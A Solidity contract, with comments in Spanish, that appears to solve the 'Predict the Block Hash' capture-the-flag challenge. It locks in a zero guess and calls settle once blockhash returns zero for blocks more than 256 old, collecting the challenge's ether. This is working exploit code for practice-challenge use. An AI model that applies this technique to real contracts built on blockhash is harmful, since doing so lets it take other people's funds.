pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    function PredictTheBlockHashChallenge() public payable {}

    function isComplete() public view returns (bool) {}

    function lockInGuess(bytes32 hash) public payable {}

    function settle() public {}
}

contract CTE_PredictTheBlockHashSolution {
    address private targetContract = 0xFbD231B35724548725dbeBB2bd27Ae2DE26a8849;
    address public owner;
    PredictTheBlockHashChallenge target;
    uint256 settlementBlockNumber;
    
    // Para evitar que alguien mas saque el ether del contrato
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // Comprueba que efectivamente yo sea el dueño (debug)
    function isOwner() public view returns(bool) {
        return msg.sender == owner;
    }
    
    // Constructor, guardo un puntero al contrato objetivo en target
    constructor() public payable {
        owner = msg.sender;
        target = PredictTheBlockHashChallenge(targetContract);
    }
    
    // Fallback para recibir fondos
    function() public payable { }
    
    // Para recuperar el ether del contrato, manda solo al owner
    function recoverFunds() public payable onlyOwner {
        owner.transfer(address(this).balance);
    }
    
    // Prueba de valor de retorno de blockhash
    function checkBlockHash() public view returns(bytes32) {
        return block.blockhash(settlementBlockNumber);
    }
    function setSettlementBlock() public returns(bytes32) {
        settlementBlockNumber = block.number + 1;
    }
    function getSettlementBlockNumber() public view returns(uint256) {
        return settlementBlockNumber;
    }
    
    // Bloqueo el valor de guess en el contrato destino, ya que el que puede adivinar es solo el que bloqueo
    // Hay que bloquear cero, ya que el exploit se basa en que blockhash devuelve 0 para bloques mas antiguos que 256
    function makeGuess() public payable {
        require(msg.value == 1 ether);
        target.lockInGuess.value(msg.value)(0);
        settlementBlockNumber = block.number + 1;
    }
    
    // Llamo a la funcion del contrato destino solo si se cumple la condicion, en caso contrario pierdo los fondos
    function solveChallenge() public payable {
        require(bytes32(0) == block.blockhash(settlementBlockNumber));
        target.settle();
    }
}